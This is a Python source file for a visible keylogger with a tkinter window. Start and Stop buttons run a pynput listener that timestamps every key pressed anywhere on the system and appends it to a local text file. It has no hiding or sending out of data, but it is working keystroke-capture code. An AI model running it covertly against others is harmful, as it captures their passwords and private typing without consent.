from pynput import keyboard
from datetime import datetime
import tkinter as tk
from tkinter import scrolledtext, messagebox

listener = None
is_running = False

def save_log(text):
    with open("keylogger.txt", "a", encoding="utf-8") as f:
        f.write(text + "\n")

def on_press(key):
    global is_running
    if not is_running:
        return

    time_now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        key_text = key.char
    except AttributeError:
        key_text = str(key)

    log = f"[{time_now}] Key Pressed: {key_text}"

    log_box.insert(tk.END, log + "\n")
    log_box.see(tk.END)
    save_log(log)

def start_monitoring():
    global listener, is_running

    if is_running:
        messagebox.showinfo("Info", "Monitoring already running.")
        return

    is_running = True
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    status_label.config(text="Status: Running")
    log_box.insert(tk.END, "Monitoring started...\n")

def stop_monitoring():
    global listener, is_running

    if listener:
        listener.stop()

    is_running = False
    status_label.config(text="Status: Stopped")
    log_box.insert(tk.END, "Monitoring stopped.\n")

root = tk.Tk()
root.title("Keylogger")
root.geometry("700x450")

status_label = tk.Label(root, text="Status: Stopped", font=("Arial", 12, "bold"))
status_label.pack(pady=5)

button_frame = tk.Frame(root)
button_frame.pack(pady=5)

start_btn = tk.Button(button_frame, text="Start", width=15, command=start_monitoring)
start_btn.grid(row=0, column=0, padx=5)

stop_btn = tk.Button(button_frame, text="Stop", width=15, command=stop_monitoring)
stop_btn.grid(row=0, column=1, padx=5)

log_box = scrolledtext.ScrolledText(root, width=85, height=20)
log_box.pack(padx=10, pady=10)

root.mainloop()